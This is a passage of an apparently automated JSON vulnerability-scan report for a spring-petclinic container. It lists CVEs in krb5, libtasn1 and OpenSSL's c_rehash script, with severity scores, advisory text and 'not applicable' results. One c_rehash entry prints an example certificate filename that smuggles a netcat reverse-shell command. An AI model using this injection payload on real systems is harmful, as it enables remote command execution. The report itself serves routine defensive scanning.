            "ShortDescription": "Insufficient input validation in Kerberos 5 may lead to denial of service when parsing message tokens with invalid length fields.",
            "FullDescription": "The `krb5` library is an implementation of the Kerberos Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS` tokens are part of the `Generic Security Services Application Program Interface` (GSS-API) used to provide secure communication between applications. A GSS token is essentially a chunk of data that encapsulates security information required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields, thus leading to denial of service.\n\nThe general structure of a wrap token contains a header, which includes fields such as `Extra Count`, and an encrypted part which includes the message.\n\nFor example, the vulnerability can be exploited in the following cases:\n\n* A wrap token with a 0 value for the `Extra Count` field, which is the header value for padding.\n* A wrap token with no header\n\nNote:\nThis attack rely heavily on the attacker ability to MiTM.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37371",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37371",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-259835",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtasn1-6",
         "source_id": "deb://debian:bullseye:libtasn1-6",
         "source_comp_id": "deb://debian:bullseye:libtasn1-6:4.16.0-2",
         "component_versions": {
            "id": "debian:bullseye:libtasn1-6",
            "vulnerable_versions": [
               "< 4.16.0-2+deb11u1"
            ],
            "fixed_versions": [
               "4.16.0-2+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-46848",
                     "cwe": [
                        "CWE-193"
                     ],
                     "cwe_details": {
                        "CWE-193": {
                           "name": "Off-by-one Error",
                           "description": "A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value."
                        }
                     },
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "GNU Libtasn1 before 4.19.0 has an ETYPE_OK off-by-one array size check that affects asn1_encode_simple_der.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-06-04T16:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-259835",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in libtasn1 allows an attacker to perform denial of service by using a public exploit.",
            "FullDescription": "[GNU libtasn](https://www.gnu.org/software/libtasn1/) is a highly portable C library that provides Abstract Syntax Notation One (ASN.1) parsing, encoding, and decoding functions. It is widely used by network and cryptography packages (e.g. GnuTLS).\nlibtasn1 implementation has an improper input validation of ETYPE, in the `ETYPE_OK` macro function. ETYPE is compared against the actual size of the ETYPE array `_asn1_tags_size` instead of `_asn1_tags_size -1` which leads the validation to pass with ETYPE out of range (when `ETYPE = _asn1_tags_size`).\n\n```\n# define ETYPE_OK(etype) (((etype) != ASN1_ETYPE_INVALID && \\\n                          (etype) <= _asn1_tags_size && \\\n                          _asn1_tags[(etype)].desc != NULL)?1:0)\n```\n\nAn attacker can exploit this issue by providing the `_asn1_tags_size` value as the ETYPE value to `ETYPE_OK`, through multiple libtasn1 APIs (as demonstrated in the public exploit). Providing this ETYPE value causes a global buffer overflow (reads 8 bytes outside of a global array) and leads to denial of service in most cases.\n\nThe official solution fixes the bug by comparing ETYPE with `_asn1_tags_size -1` as following:\n```\n(etype) < _asn1_tags_size\n```",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this issue in a server process can cause denial-of-service when it crashes.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A published proof-of-concept is available for this issue.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "In order to exploit this issue an attacker must be able to provide the ETYPE value to the `ETYPE_OK` macro, or at least manipulate it through multiple libtasn1 APIs.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC (Steps to Reproduce)",
                  "Url": "https://gitlab.com/gnutls/libtasn1/-/issues/32",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://gitlab.com/gnutls/libtasn1/-/commit/44a700d2051a666235748970c2df047ff207aeb5#note_1152994262",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libtasn1-6:4.16.0-2",
            "cve_id": "CVE-2021-46848",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libtasn1-6:4.16.0-2",
            "vulnerability_id": "CVE-2021-46848",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-229267",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u3"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2068",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-229267",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper input validation in OpenSSL's c_rehash script leads to command injection.",
            "FullDescription": "OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges",
                  "IsPositive": 0,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220621.txt",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-2068",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable string 'c_rehash' was not found in the image",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-2068",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-229267",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u3"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-2068",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-229267",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper input validation in OpenSSL's c_rehash script leads to command injection.",
            "FullDescription": "OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges",
                  "IsPositive": 0,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OpenSSL's advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220621.txt",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-2068",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable string 'c_rehash' was not found in the image",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-2068",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-209544",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "0:1.0.2 ≤ Version < 0:1.0.2ze",
               "0:1.1.1 ≤ Version < 1.1.1n-0+deb11u2",
               "0:3.0.0 ≤ Version < 0:3.0.3"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1292",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
               "provider": "JFrog"
            }
         },
         "edited": "2022-12-22T09:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-209544",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper filename validation in `c_rehash` can lead to arbitrary code execution.",
            "FullDescription": "[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" > \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploiting this vulnerability leads to code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=blobdiff;f=tools/c_rehash.in;h=a630773a0240834476e74a7eb049a0d22729c383;hp=d51d8856d709cda39f939c1e04faeb0a31d599e6;hb=1ad73b4d27bd8c1b369a3cd453681d3a4f1bb9b2;hpb=7d56a74a96828985db7354a55227a511615f732b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup with PoC",
                  "Url": "https://github.com/alcaparra/CVE-2022-1292",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2022-1292",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable string 'c_rehash' was not found in the image",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2022-1292",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-209544",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "0:1.0.2 ≤ Version < 0:1.0.2ze",
               "0:1.1.1 ≤ Version < 1.1.1n-0+deb11u2",
               "0:3.0.0 ≤ Version < 0:3.0.3"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1292",
                     "cwe": [
                        "CWE-78"
                     ],
                     "cwe_details": {
                        "CWE-78": {
                           "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
                           "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "5"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
